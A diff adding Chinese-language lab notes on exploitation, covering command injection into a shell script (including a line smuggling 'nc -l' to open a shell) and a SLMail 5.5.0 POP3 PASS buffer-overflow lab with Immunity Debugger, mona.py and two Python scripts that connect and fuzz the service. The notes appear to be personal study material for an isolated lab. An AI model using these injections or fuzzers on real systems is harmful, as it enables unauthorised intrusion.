@@ -1,0 +1,98 @@
+kali: bridge  1.117
+	vim a.sh	
+		echo $1 #打印参数内容
+	./a.sh  hello
+	./a.sh	pwd
+	./a.sh	;pwd
+	./a.sh  ;nc -l  #用nc开一个shell
+	#这个程序出现漏洞的原因是没有对输入的参数进行检测过滤消毒。
+	缓冲区：内存里面的一个片段。
+	缓冲区溢出：程序对缓冲区的边界大小没有做出限制，导致
+	【类似】
+	./a.sh | ls
+	./a.sh && ls
+	./a.sh & ls
+	如何发现漏洞：
+	源码审计
+	逆向工程
+	模糊测试
+	
+xp:   1.119
+	fuzzer:
+			xp:
+				slmail 5.5.0
+				immunitydebugger
+				mona.py #辅助定位
+	slmail 安装：
+	evaluate-->1.119-->lab.com--->dns:1.1--->no---
+	mona.py --->放到immunitydebugger的安装目录中的/pycommondas中
+实验步骤：
+kali:
+	ping 1.119
+	nc 192.168.1.119 25 #可以连接的到
+	nc 192.168.1.119 110 #pop3邮件服务提供的命令
+		USER tony #user | ls
+		PASS test #pass命令存在缓冲区溢出漏洞
+netstat -ano -->110的pid
+	汇编指令窗口  寄存器（assia码）
+	内存数据
+	生成唯一字符串：
+	cd /usr/share/metasploit-framework/tools
+	./pattern_create.rb 2700
+	eip:下一条cpu要运行的内存地址，
+	esp:shellcode 代码
+	!mona modules #执行莫纳脚本
+	!mona find -s " " -m open32.dll  #j
+
+
+## python脚本
+```python
+#01.py
+#!/usr/bin/python
+import socket
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+try:
+	print "\nsending evil buffer...."
+	s.connect(('192.168.1.119',110))
+	data=s.recv(1024)
+	print data
+
+	s.send('USER tony'+'\r\n')
+	data=s.recv(1024)
+	print data
+
+	s.send('PASS test\r\n')
+	data=s.recv(1024)
+	print data
+
+	s.close()
+	print "\nDone!"
+
+except:
+	print "could not connect to pop3!"
+```
+```python
+#02.py
+#!/usr/bin/python
+import socket
+
+buffer=["A"]
+counter=100
+while len(buffer) <= 50:
+	buffer.append("A"*counter)
+	counter=counter+200
+
+for string in buffer:
+	print "FUzzing PASS with %s bytes" %len(string)
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	connect=s.connect(('192.168.1.119',110))
+	s.recv(1024)
+	s.send('USER test'+'\r\n')
+	s.recv(1024)
+	s.send('PASS ' + string + '\r\n')
+	s.send('QUIT\r\n')
+	s.close()
+```
+
+[参考2](https://blog.csdn.net/sriting/article/details/51920017)
+[参考](https://blog.csdn.net/SKI_12/article/details/80950537)
